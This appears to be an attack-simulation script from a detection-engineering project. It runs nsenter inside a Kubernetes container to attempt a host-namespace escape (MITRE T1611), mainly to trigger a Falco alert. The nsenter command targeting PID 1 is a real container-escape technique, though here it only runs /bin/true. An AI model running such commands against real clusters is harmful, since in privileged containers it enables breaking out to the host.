#!/bin/bash
# ============================================================================
# Attack Simulation: Container Escape via nsenter
# MITRE ATT&CK: T1611 - Escape to Host
# Run INSIDE a target container: kubectl exec -it <pod> -n <ns> -- sh THIS.sh
# Fires detection: detections/falco/container-escape.yaml   (Falco, CRITICAL)
# ============================================================================
#
# Runs nsenter to enter the host namespaces. Without privileged/CAP_SYS_ADMIN the
# escape FAILS — but the execve of `nsenter` still fires the Falco rule, which is
# the point: Falco sees the *attempt*.
#
# COVERAGE NOTE (see docs/DETECTION-COVERAGE.md): the KQL sibling
# detections/kql/container-escape.kql greps ContainerLogV2 for the string
# "nsenter" and may NOT fire here, because a failed nsenter rarely prints its own
# name to container stdout. Trust the Falco rule; the KQL is a weak backstop.

echo "[*] Attempting host-namespace entry via nsenter (expected to fail without privileges)..."
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/true 2>/dev/null || \
  echo "[*] nsenter denied (as expected) — the execve still fired Falco."

echo ""
echo "[*] Expected detection: Falco 'Container Escape via nsenter' (T1611, CRITICAL)"
